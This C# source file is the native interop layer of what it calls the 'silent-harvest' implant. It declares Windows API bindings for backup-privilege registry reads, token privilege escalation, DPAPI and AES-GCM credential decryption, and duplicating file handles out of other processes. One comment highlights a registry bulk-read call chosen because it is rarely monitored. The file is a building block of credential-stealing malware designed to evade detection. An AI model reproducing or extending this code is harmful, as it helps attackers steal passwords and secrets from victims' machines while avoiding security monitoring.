// silent-harvest implant — native interop layer
// C# 5 compatible (in-box .NET Framework 4.x csc.exe)
using System;
using System.Runtime.InteropServices;
using System.Text;

namespace SilentHarvest
{
    public static class Native
    {
        public const uint KEY_READ = 0x20019;
        public const uint REG_OPTION_BACKUP_RESTORE = 0x00000004; // NtOpenKeyEx OpenOptions
        public const uint OBJ_CASE_INSENSITIVE = 0x00000040;
        public const int ERROR_SUCCESS = 0;
        public const int ERROR_MORE_DATA = 234;
        public const int ERROR_NO_MORE_ITEMS = 259;
        public const int ERROR_NOT_ALL_ASSIGNED = 1300;

        // ---------------------------------------------------------------- ntdll
        [DllImport("ntdll.dll")]
        public static extern int NtOpenKeyEx(out IntPtr KeyHandle, uint DesiredAccess,
                                             ref OBJECT_ATTRIBUTES ObjectAttributes,
                                             uint OpenOptions);

        [DllImport("ntdll.dll")]
        public static extern int RtlNtStatusToDosError(int Status);

        [StructLayout(LayoutKind.Sequential)]
        public struct UNICODE_STRING
        {
            public ushort Length;
            public ushort MaximumLength;
            public IntPtr Buffer;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct OBJECT_ATTRIBUTES
        {
            public int Length;
            public IntPtr RootDirectory;
            public IntPtr ObjectName;   // -> UNICODE_STRING
            public uint Attributes;
            public IntPtr SecurityDescriptor;
            public IntPtr SecurityQualityOfService;
        }

        public static OBJECT_ATTRIBUTES MakeObjectAttributes(string ntPath, out IntPtr[] toFree)
        {
            byte[] pathBytes = Encoding.Unicode.GetBytes(ntPath);
            IntPtr buf = Marshal.AllocHGlobal(pathBytes.Length + 2);
            Marshal.Copy(pathBytes, 0, buf, pathBytes.Length);
            Marshal.WriteInt16(buf, pathBytes.Length, 0); // terminating L'\0'

            UNICODE_STRING us = new UNICODE_STRING();
            us.Length = (ushort)pathBytes.Length;
            us.MaximumLength = (ushort)(pathBytes.Length + 2);
            us.Buffer = buf;

            IntPtr usPtr = Marshal.AllocHGlobal(Marshal.SizeOf(typeof(UNICODE_STRING)));
            Marshal.StructureToPtr(us, usPtr, false);

            OBJECT_ATTRIBUTES oa = new OBJECT_ATTRIBUTES();
            oa.Length = Marshal.SizeOf(typeof(OBJECT_ATTRIBUTES));
            oa.RootDirectory = IntPtr.Zero;
            oa.ObjectName = usPtr;
            oa.Attributes = OBJ_CASE_INSENSITIVE;
            oa.SecurityDescriptor = IntPtr.Zero;
            oa.SecurityQualityOfService = IntPtr.Zero;

            toFree = new IntPtr[] { buf, usPtr };
            return oa;
        }

        public static void FreeObjectAttributes(IntPtr[] toFree)
        {
            if (toFree == null) return;
            foreach (IntPtr p in toFree)
                if (p != IntPtr.Zero) Marshal.FreeHGlobal(p);
        }

        // ------------------------------------------------------------- advapi32
        // RegQueryMultipleValuesW — the rarely-monitored bulk-read API at the
        // core of the technique. Takes the HKEY returned by NtOpenKeyEx.
        [DllImport("advapi32.dll", CharSet = CharSet.Unicode, SetLastError = false)]
        public static extern int RegQueryMultipleValuesW(IntPtr hKey, IntPtr valList,
                                                         uint numVals, IntPtr lpValueBuf,
                                                         ref int ldwTotSize);

        [StructLayout(LayoutKind.Sequential)]
        public struct VALENTW
        {
            public IntPtr ve_valuename;  // LPWSTR
            public int ve_valuelen;      // bytes of data
            public IntPtr ve_valueptr;   // pointer INTO lpValueBuf
            public int ve_type;
        }

        [DllImport("advapi32.dll", CharSet = CharSet.Unicode)]
        public static extern int RegEnumKeyExW(IntPtr hKey, int dwIndex, StringBuilder lpName,
                                               ref int lpcbName, IntPtr reserved,
                                               IntPtr lpClass, IntPtr lpcbClass,
                                               IntPtr lpftLastWriteTime);

        [DllImport("advapi32.dll")]
        public static extern int RegCloseKey(IntPtr hKey);

        [DllImport("advapi32.dll", CharSet = CharSet.Unicode)]
        public static extern int RegQueryInfoKeyW(IntPtr hKey, System.Text.StringBuilder cls,
                                                  ref int lpcchClass, IntPtr reserved,
                                                  IntPtr pcSubKeys, IntPtr pcbMaxSubKeyLen,
                                                  IntPtr pcbMaxClassLen, IntPtr pcValues,
                                                  IntPtr pcbMaxValueNameLen, IntPtr pcbMaxValueLen,
                                                  IntPtr pcbSecurityDescriptor,
                                                  IntPtr lpftLastWriteTime);

        // ---------------------------------------------------------- privileges
        [DllImport("advapi32.dll", SetLastError = true)]
        public static extern bool OpenProcessToken(IntPtr ProcessHandle, uint DesiredAccess,
                                                   out IntPtr TokenHandle);

        [DllImport("advapi32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
        public static extern bool LookupPrivilegeValueW(string lpSystemName, string lpName,
                                                        ref LUID lpLuid);

        [StructLayout(LayoutKind.Sequential)]
        public struct LUID { public uint LowPart; public int HighPart; }

        [StructLayout(LayoutKind.Sequential)]
        public struct LUID_AND_ATTRIBUTES
        {
            public LUID Luid;
            public uint Attributes;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct TOKEN_PRIVILEGES
        {
            public int PrivilegeCount;
            public LUID_AND_ATTRIBUTES Privilege; // first of ANYSIZE_ARRAY
        }

        [DllImport("advapi32.dll", SetLastError = true)]
        public static extern bool AdjustTokenPrivileges(IntPtr TokenHandle, bool DisableAllPrivileges,
                                                        ref TOKEN_PRIVILEGES NewState,
                                                        int BufferLength, IntPtr PreviousState,
                                                        IntPtr ReturnLength);

        [DllImport("advapi32.dll", SetLastError = true)]
        public static extern bool GetTokenInformation(IntPtr TokenHandle, int TokenInformationClass,
                                                      IntPtr TokenInformation, int TokenInformationLength,
                                                      out int ReturnLength);

        [DllImport("kernel32.dll")]
        public static extern IntPtr GetCurrentProcess();

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool CloseHandle(IntPtr hObject);

        public const uint TOKEN_QUERY = 0x0008;
        public const uint TOKEN_ADJUST_PRIVILEGES = 0x0020;
        public const uint SE_PRIVILEGE_ENABLED = 0x00000002;
        public const int TokenElevation = 20;

        // ---------------------------------------------------------------- DPAPI
        [StructLayout(LayoutKind.Sequential)]
        public struct DATA_BLOB
        {
            public int cbData;
            public IntPtr pbData;
        }

        [DllImport("crypt32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
        public static extern bool CryptUnprotectData(ref DATA_BLOB pDataIn, string szDataDescr,
                                                     IntPtr pOptionalEntropy, IntPtr pvReserved,
                                                     IntPtr pPromptStruct, int dwFlags,
                                                     ref DATA_BLOB pDataOut);

        [DllImport("kernel32.dll")]
        public static extern IntPtr LocalFree(IntPtr hMem);

        // ---------------------------------------------------------- file reads
        [DllImport("kernel32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
        public static extern IntPtr CreateFileW(string lpFileName, uint dwDesiredAccess,
                                                uint dwShareMode, IntPtr lpSecurityAttributes,
                                                uint dwCreationDisposition, uint dwFlagsAndAttributes,
                                                IntPtr hTemplateFile);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool ReadFile(IntPtr hFile, byte[] lpBuffer, uint nNumberOfBytesToRead,
                                           out uint lpNumberOfBytesRead, IntPtr lpOverlapped);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern int GetFileSize(IntPtr hFile, out int lpFileSizeHigh);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool SetFilePointerEx(IntPtr hFile, long liDistanceToMove,
                                                   out long lpNewFilePointer, uint dwMoveMethod);

        [DllImport("kernel32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
        public static extern bool DeleteFileW(string lpFileName);

        public const uint GENERIC_READ = 0x80000000;
        public const uint FILE_SHARE_READ = 0x00000001;
        public const uint FILE_SHARE_WRITE = 0x00000002;
        public const uint FILE_SHARE_DELETE = 0x00000004;
        public const uint OPEN_EXISTING = 3;
        public const uint FILE_FLAG_BACKUP_SEMANTICS = 0x02000000;
        public static readonly IntPtr INVALID_HANDLE_VALUE = new IntPtr(-1);

        // ---------------------------------------------------------------- bcrypt
        [DllImport("bcrypt.dll")]
        public static extern int BCryptDecrypt(IntPtr hKey, byte[] pbInput, int cbInput,
            ref BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO pPaddingInfo, byte[] pbIV, int cbIV,
            byte[] pbOutput, int cbOutput, out int pcbResult, int dwFlags);

        [DllImport("bcrypt.dll", CharSet = CharSet.Unicode)]
        public static extern int BCryptOpenAlgorithmProvider(out IntPtr phAlgorithm,
                                                             string pszAlgId, string pszImplementation,
                                                             uint dwFlags);

        [DllImport("bcrypt.dll")]
        public static extern int BCryptCloseAlgorithmProvider(IntPtr hAlgorithm, uint dwFlags);

        [DllImport("bcrypt.dll", CharSet = CharSet.Unicode)]
        public static extern int BCryptSetProperty(IntPtr hObject, string pszProperty,
                                                   byte[] pbInput, int cbInput, int dwFlags);

        [DllImport("bcrypt.dll", CharSet = CharSet.Unicode)]
        public static extern int BCryptGetProperty(IntPtr hObject, string pszProperty,
                                                   byte[] pbOutput, int cbOutput,
                                                   out int pcbResult, int dwFlags);

        [DllImport("bcrypt.dll")]
        public static extern int BCryptGenerateSymmetricKey(IntPtr hAlgorithm, out IntPtr phKey,
                                                            IntPtr pbKeyObject, int cbKeyObject,
                                                            byte[] pbSecret, int cbSecret, int dwFlags);

        [DllImport("bcrypt.dll")]
        public static extern int BCryptDestroyKey(IntPtr hKey);

        [StructLayout(LayoutKind.Sequential)]
        public struct BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO
        {
            public int cbSize;
            public int dwInfoVersion;
            public IntPtr pbNonce;      public int cbNonce;
            public IntPtr pbAuthData;   public int cbAuthData;
            public IntPtr pbTag;        public int cbTag;
            public IntPtr pbMacContext; public int cbMacContext;
            public int cbAAD;
            public long cbData;         // ULONGLONG in bcrypt.h — 8 bytes
            public int dwFlags;
        }

        [DllImport("bcrypt.dll")]
        public static extern int BCryptEncrypt(IntPtr hKey, byte[] pbInput, int cbInput,
                                               ref BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO pPaddingInfo,
                                               byte[] pbIV, int cbIV, byte[] pbOutput, int cbOutput,
                                               out int pcbResult, int dwFlags);

        public const int BCRYPT_AUTHENTICATED_MODE_INFO_VERSION = 1;

        // ------------------------------------------------- handle table walk
        [DllImport("ntdll.dll")]
        public static extern int NtQuerySystemInformation(int cls, IntPtr info,
                                                          int len, out int returnLen);
        [DllImport("ntdll.dll")]
        public static extern int NtQueryObject(IntPtr handle, int cls,
                                               IntPtr info, int len, out int returnLen);

        [StructLayout(LayoutKind.Sequential)]
        public struct IO_STATUS_BLOCK
        {
            public uint Status;
            public IntPtr Information;
        }

        // offset-addressed read: does not move the FILE_OBJECT's shared
        // CurrentByteOffset, unlike ReadFile on a seeked handle
        [DllImport("ntdll.dll")]
        public static extern int NtReadFile(IntPtr FileHandle, IntPtr Event,
            IntPtr ApcRoutine, IntPtr ApcContext, ref IO_STATUS_BLOCK IoStatusBlock,
            byte[] Buffer, uint Length, ref long ByteOffset, IntPtr Key);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr OpenProcess(uint access, bool inherit, int pid);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool DuplicateHandle(IntPtr hSrcProcess, IntPtr hSrc,
                                                  IntPtr hTargetProcess, out IntPtr hTarget,
                                                  uint dwDesiredAccess, bool bInheritHandle,
                                                  uint dwOptions);

        public const uint PROCESS_DUP_HANDLE = 0x0040;
        public const uint DUPLICATE_SAME_ACCESS = 0x0002;
        public const int SystemExtendedHandleInformation = 0x40;
        public const int ObjectNameInformation = 1;
        public static string NtStatusName(int st)
        {
            switch ((uint)st)
            {
                case 0x00000000: return "STATUS_SUCCESS";
                case 0xC0000022: return "STATUS_ACCESS_DENIED";
                case 0xC0000034: return "STATUS_OBJECT_NAME_NOT_FOUND";
                case 0xC000003A: return "STATUS_OBJECT_PATH_NOT_FOUND";
                case 0xC00000BB: return "STATUS_NOT_SUPPORTED";
                case 0xC0000043: return "STATUS_SHARING_VIOLATION";
                default: return "NTSTATUS_0x" + ((uint)st).ToString("X8");
            }
        }
    }
}
